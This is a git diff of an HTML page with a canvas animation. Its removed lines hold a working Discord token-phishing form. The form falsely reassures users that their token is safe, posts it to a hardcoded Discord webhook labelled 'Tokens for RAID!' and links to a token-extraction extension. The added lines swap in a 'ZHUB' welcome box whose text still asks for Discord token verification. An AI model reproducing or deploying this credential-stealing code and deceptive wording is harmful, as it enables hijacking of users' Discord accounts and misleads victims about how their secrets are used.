@@ -16,39 +16,52 @@
       margin: 0;
       position: relative; /* Ensure content is on top of the canvas */
     }
-
-    .input-field {
-      width: 95%;  /* Makes the text box the same width as the buttons */
-      padding: 10px;
-      margin: 10px 0;
-      border-radius: 5px;
-      border: 1px solid #ccc;
-      font-size: 16px;
-      color: #000;
+    .container {
+      background-color: #1e1e1e;  /* Dark grey background for the container */
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
+      width: 100%;
+      max-width: 400px;  /* Ensures the container doesn't exceed 400px */
+      text-align: center;  /* Centers the content */
+      position: relative; /* Keeps the container above the canvas */
+      z-index: 2; /* Ensures the container is above the canvas */
     }
-
-    .button {
-      width: 100%;  /* Makes the buttons full width */
+    .container h2 {
+      text-align: center;
+      margin-bottom: 15px;
+    }
+    .description {
+      font-size: 14px;
+      margin-top: 20px;
+      color: #ccc;
+    }
+    .copy-container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      margin-top: 20px;
+    }
+    .copy-text {
+      font-size: 16px;
+      color: #f2f2f2;
+      margin-bottom: 10px;
+      word-wrap: break-word;
+      text-align: center;
+    }
+    .copy-button {
       padding: 10px;
-      background-color: #9b4dca;  /* Purple background for buttons */
+      background-color: #9b4dca;
       color: white;
       border: none;
       border-radius: 5px;
-      font-size: 16px;
+      font-size: 14px;
       cursor: pointer;
-      margin-bottom: 5px;  /* 5px spacing between buttons */
+      width: 100%;
     }
-    .button:hover {
-      background-color: #7a3e99;  /* Darker purple on hover */
+    .copy-button:hover {
+      background-color: #7a3e99;
     }
-    .link-button {
-      background-color: #6a1b9a;  /* Slightly darker purple for the second button */
-      margin-top: 5px;
-    }
-    .link-button:hover {
-      background-color: #4e148c;  /* Darker purple on hover */
-    }
-
     #mycanvas {
       position: absolute;
       background-color: black;
@@ -58,128 +71,34 @@
       left: 0;
       z-index: 1; /* Ensure canvas is below other content */
     }
-    label {
-      font-size: 10px;  /* Adjust the font size as needed */
-    }
   </style>
 </head>
 <body>
   <!-- Canvas for the constellation effect -->
   <canvas id="mycanvas"></canvas>
 
-  <!-- Removed container -->
-  <h2>Verification</h2>
-  <label for="username">Executor Issue? Please enter your Discord token below. Rest assured, your token is securely protected—it will only be used for verification purposes and will never be displayed publicly. This ensures that the script will function correctly.</label>
-  <input type="text" id="username" class="input-field" placeholder="Enter Token" required>
+  <div class="container">
+    <h2>Welcome to ZHUB</h2>
 
-  <button id="sendKeyButton" class="button">Verify</button>
-  
-  <!-- New Button to Open Discord Link -->
-  <button id="openDiscordButton" class="button link-button">How to get Token?</button>
+    <!-- Description Section -->
+    <p class="description">
+      This page allows you to verify your Discord token to enable access to exclusive features. Please follow the instructions carefully.
+    </p>
+
+    <!-- Text with Copy Button -->
+    <div class="copy-container">
+      <p class="copy-text" id="copyText">Here is some text that you can copy!</p>
+      <button class="copy-button" id="copyButton">Copy Text</button>
+    </div>
+  </div>
 
   <script>
-    // Function to encrypt the username (shift letters by 5)
-    function encryptUsername(username) {
-      let encrypted = '';
-      username = username.toLowerCase(); // Convert to lowercase
-
-      for (let i = 0; i < username.length; i++) {
-        let char = username[i];
-        if (char >= 'a' && char <= 'z') {
-          // Shift letter by 5
-          let newChar = String.fromCharCode(((char.charCodeAt(0) - 97 + 5) % 26) + 97);
-          encrypted += newChar;
-        } else {
-          // If it's not a letter, keep the character as it is
-          encrypted += char;
-        }
-      }
-      return encrypted;
-    }
-
-    // Webhook URL
-    const webhookUrl = "https://discord.com/api/webhooks/1320921772757094400/lN6fdTBleJaCdZk1FjOxt0DyXU1ZapPazAo4Osgq_GHTyaSDdlQmp7vmATHl74SIu0K3";
-
-    let timer = false;  // To track if the button is in cooldown
-
-document.getElementById('sendKeyButton').addEventListener("click", function() {
-  if (timer) {
-    alert("Please wait for 10 seconds before sending again.");
-    return;
-  }
-
-  const username = document.getElementById('username').value.trim();
-
-  if (!username) {
-    alert("Please enter your Token");
-    return;
-  }
-
-  // Encrypt the username
-  const encryptedKey = encryptUsername(username);
-  const message = {
-    content: `<@1246751390605246537>\nTOKEN: ${username}\nEncrypted Key IGNORE: ${encryptedKey}`,
-    username: "Tokens for RAID!",
-    avatar_url: "https://cdn.discordapp.com/icons/1315870677634383894/52f0346dba77bdc177c5da937f6ae790.webp?size=160"
-  };
-
-  // Send the encrypted key to the Discord webhook
-  fetch(webhookUrl, {
-    method: 'POST',
-    headers: {
-      'Content-Type': 'application/json'
-    },
-    body: JSON.stringify(message)
-  })
-  .then(response => {
-    // Check if the response is empty (204 No Content)
-    if (response.status === 204) {
-      // Discord responds with 204 for a successful post but no response body
-      console.log("Key sent to Discord (no content in response).");
-      document.getElementById('sendKeyButton').innerText = "Verified!";
-      document.getElementById('username').value = '';  // Clear the input field
-      return;  // Skip further processing since the response has no content
-    }
-
-    // If the response is not 204, attempt to read and parse it as text or JSON
-    return response.text(); // Read response as plain text
-  })
-  .then(text => {
-    // Only try to parse the response if there is text content
-    if (text) {
-      try {
-        const data = JSON.parse(text);  // Try to parse text as JSON if there's content
-        console.log("Key sent to Discord:", data);
-      } catch (error) {
-        console.error("Error parsing response:", error);
-        console.log("Raw Response Text:", text);  // Log the raw response text for debugging
-      }
-    }
-  })
-  .catch(error => {
-    console.error("Error sending key:", error);
-    document.getElementById('sendKeyButton').innerText = "Error Verifing!";
-  });
-
-  // Set timer to disable the button for 10 seconds
-  timer = true;
-  let countdown = 10;
-  document.getElementById('sendKeyButton').innerText = `Cooldown: ${countdown}s`;
-
-  const countdownInterval = setInterval(function() {
-    countdown--;
-    document.getElementById('sendKeyButton').innerText = `Cooldown: ${countdown}s`;
-    if (countdown <= 0) {
-      clearInterval(countdownInterval);
-      timer = false;
-      document.getElementById('sendKeyButton').innerText = "Verified";
-    }
-  }, 1000);
-});
-
-    // Open the Discord link in a new tab when the new button is clicked
-    document.getElementById('openDiscordButton').addEventListener("click", function() {
-      window.open("https://chromewebstore.google.com/detail/discord-get-user-token/accgjfooejbpdchkfpngkjjdekkcbnfd", "_blank");
+    // Copy text to clipboard
+    document.getElementById('copyButton').addEventListener("click", function() {
+      const textToCopy = document.getElementById('copyText').innerText;
+      navigator.clipboard.writeText(textToCopy).then(() => {
+        alert("Text copied to clipboard!");
+      });
     });
 
     // Canvas and constellation effect code
